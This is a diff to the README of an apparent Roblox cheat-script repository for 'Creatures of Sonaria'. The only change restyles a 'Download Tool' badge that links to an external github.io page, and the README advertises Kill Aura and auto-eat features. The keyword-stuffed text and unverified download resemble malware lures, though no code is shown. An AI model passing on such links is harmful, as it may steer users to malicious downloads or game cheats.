@@ -4,7 +4,7 @@
 
 Welcome to the official repository for the target utility, an advanced optimization tool designed to streamline your in-game resource management. Utilizing the **roblox creatures of sonaria script** dynamic execution framework, users can achieve better in-game efficiency.
 
-[![Download Tool](https://img.shields.io/badge/Download-Creatures_of_Sonaria_Script-brightgreen)](https://carstdasd.github.io/creatures-of-sonaria/)
+[![Download Tool](https://img.shields.io/badge/Download-Creatures_of_Sonaria_Script-brightgreen?style=for-the-badge)](https://carstdasd.github.io/creatures-of-sonaria/)
 
 <img width="1383" height="767" alt="Creatures of Sonaria Script - Kill Aura, Auto Eat , Auto Drink" src="https://github.com/user-attachments/assets/e7b3e98b-5548-4fa7-8a40-b4dbbbc07392" />
 
